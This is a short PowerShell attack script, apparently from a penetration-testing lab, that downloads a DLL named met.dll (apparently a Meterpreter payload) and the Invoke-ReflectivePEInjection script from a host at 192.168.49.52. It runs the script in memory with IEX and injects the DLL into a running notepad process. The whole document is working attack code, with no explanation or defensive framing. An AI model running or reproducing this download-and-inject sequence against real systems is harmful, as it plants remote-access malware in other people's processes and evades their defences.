$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.52:8000/met.dll')
$procid = (Get-Process -Name notepad).Id
IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.52:8000/Invoke-ReflectivePEInjection.ps1')
#Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid

